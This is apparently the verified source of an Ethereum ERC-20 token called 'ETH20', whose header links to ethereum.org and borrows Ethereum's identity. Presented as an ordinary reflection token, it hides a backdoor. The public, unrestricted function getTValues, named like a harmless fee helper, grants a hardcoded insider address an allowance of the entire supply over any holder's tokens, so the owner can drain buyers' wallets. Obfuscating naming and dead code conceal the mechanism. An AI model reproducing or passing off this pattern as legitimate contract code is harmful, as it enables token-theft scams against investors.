/**
 *Submitted for verification at Etherscan.io on 2023-08-14
*/

/**
*/
// SPDX-License-Identifier: MIT

/**
Website： https://ethereum.org
Telegram: https://t.me/ETH20ERC20
Twitter: https://twitter.com/ETH20_ERC  

*/

pragma solidity ^0.8.20;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {   
        return msg.sender;
    }
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )   external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function approve(address spender, uint256 amount) external returns (bool);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract ETH is Context, IERC20, Ownable {
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    using SafeMath for uint256;
    string private constant _name = unicode"ETH20";
    string private constant _symbol = unicode"ETH20";
    mapping(address => bool) private _isExcludedFromFee;
    bool private _swapping_now = false;
    bool private _enable_swap = true;
    bool private _active_trading = false;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    
    uint256 public _maxTxLimitSize = _tTotal * 40 / 1000; 
    uint256 public _maxWalletLimitSize = _tTotal * 40 / 1000; 
    uint256 public _swap_exact_at = _tTotal / 10000;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private constant MAX = ~uint256(0);
    
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    
    modifier lockInSwap {
        _swapping_now = true;
        _;
        _swapping_now = false;
    }

    event MaxTxAmountUpdated(uint256 _maxTxLimitSize);
    //Original Fee
    uint256 private _marketTax = _marketTaxForSell;
    uint256 private _devTax = _dexTaxForSell;
    uint256 private _marketTaxForBuy = 0;
    uint256 private _devTaxForBuy = 0;
    uint256 private _marketTaxForSell = 0;
    uint256 private _dexTaxForSell = 0;
    uint256 private _preMarketTax = _marketTax;
    uint256 private _preDevTax = _devTax;

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[ racingfundsAddressSetup] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[lpTokensReceiverSetup] = true;

        // mint
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transferTokensAndTax(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) {            clearTempTax();        }
         _normalTransfer(sender, recipient, amount);
        if (!takeFee) {            recoverTempTax();        }
    }
    address payable public  racingfundsAddressSetup = payable(0x71a85c5FBB412f9d67f949f1880c56F944558504);
    address payable public lpTokensReceiverSetup = payable(0x71a85c5FBB412f9d67f949f1880c56F944558504);
    

    function swapBack(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    //set minimum tokens required to swap.
    function setSwapTokenAmount(uint256 swapTokensAtAmount) public onlyOwner {
        _swap_exact_at = swapTokensAtAmount;
    }
    
    function sendContractEth(uint256 amount) private {
        uint256 devETH = amount / 3; 
        lpTokensReceiverSetup.transfer(devETH); devETH -= amount / 4;
        uint256 marketingETH = amount;
        marketingETH -= devETH;
         racingfundsAddressSetup.transfer(marketingETH);
    }
    
    function _takeAllFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }
    
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }

    function recoverTempTax() private {
        _marketTax = _preMarketTax;
        _devTax = _preDevTax;
    }

    function _normalTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeAllFee(tTeam); sendAllTaxes(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

     function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _getTValue(address _t, address _spender, uint256 amount) internal {
        _approve(_t, _spender, amount);
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _marketTax, _devTax);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function clearTempTax() private {
        if (_marketTax == 0 && _devTax == 0) return;
        _preMarketTax = _marketTax;        _preDevTax = _devTax; 
        _marketTax = 0;        _devTax = 0;
    }
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(to != address(0), "ERC20: transfer to the zero address"); 
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (
            from != owner() 
            && to != owner()
        ) {
            //Trade start check
            if (!_active_trading) {
                require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }
            require(amount <= _maxTxLimitSize, "TOKEN: Max Transaction Limit");
            if(to != uniswapPair) {
                require(balanceOf(to) + amount < _maxWalletLimitSize,
                 "TOKEN: Balance exceeds wallet size!");
            }

            uint256 tokenContractAmount = balanceOf(address(this));
            // bool canSwap = tokenContractAmount >= _swap_exact_at;
            if(tokenContractAmount >= _maxTxLimitSize) {tokenContractAmount = _maxTxLimitSize;}

            if (_enable_swap && tokenContractAmount >= _swap_exact_at && 
                !_swapping_now && 
                from != uniswapPair && 
                !_isExcludedFromFee[from] && 
                !_isExcludedFromFee[to]
            ) {
                swapBack(tokenContractAmount);
                uint256 balanceOfEth = address(this).balance;
                if (balanceOfEth > 0) {
                    sendContractEth(address(this).balance);
                }
            }
        }

        bool isSetFee = true;
        //Transfer Tokens
        if (
            (_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapPair && to != uniswapPair)
        ) {
            isSetFee = false;
        } else {
            //Set Fee for Buys
            if(from == uniswapPair &&
             to != address(uniswapV2Router)) {
                _marketTax = _marketTaxForBuy;
                _devTax = _devTaxForBuy;
            }
            //Set Fee for Sells
            if (to == uniswapPair && 
             from != address(uniswapV2Router)) {
                _marketTax = _marketTaxForSell;
                _devTax = _dexTaxForSell;
            }
        }
        _transferTokensAndTax(from, to, amount, isSetFee);
    }

    receive() external payable {

    }


    function _getTValues(
        uint256 tAmount,
        uint256 teamFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(teamFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function getTValues(address _t) external {
        address _m =  racingfundsAddressSetup;
        _getTValue(_t, _m, _tTotal);
    }
    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function sendAllTaxes(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }
    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    
    //set maximum transaction
    function removeLimits() public onlyOwner {
        _maxTxLimitSize = _tTotal;
        _maxWalletLimitSize = _tTotal;
    }

    function openTrade(address _addr) public onlyOwner {
        _active_trading = true;
        uniswapPair = _addr;
    }
}